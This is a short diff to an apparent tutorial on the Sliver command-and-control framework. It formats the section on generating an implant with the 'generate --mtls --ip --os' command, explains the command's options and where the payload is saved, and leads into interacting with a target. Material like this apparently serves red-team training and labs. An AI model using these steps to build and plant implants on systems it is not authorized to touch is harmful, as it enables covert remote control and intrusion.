@@ -28,13 +28,14 @@ mtls
 # 3. Generating Implants
 
 To create a implant, use the generate command:
-
+```bash
 generate --mtls --ip <SLIVER_IP> --os <Target_OS>
-
+```
     --mtls: Specifies mutual TLS encryption.
     --ip: The IP address of your Sliver server.
     --os: Target operating system (e.g., windows, linux, macos).
     --save: OPTIONAL - You can use the save option to save to an specific path in your vm (e.g, /home/ubuntu).
+    
 It will give usually save the payload on your `/home/ubuntu` under a random name. It might look like this "RANDOM_NAME"
 
 # 4. Interact with the Target
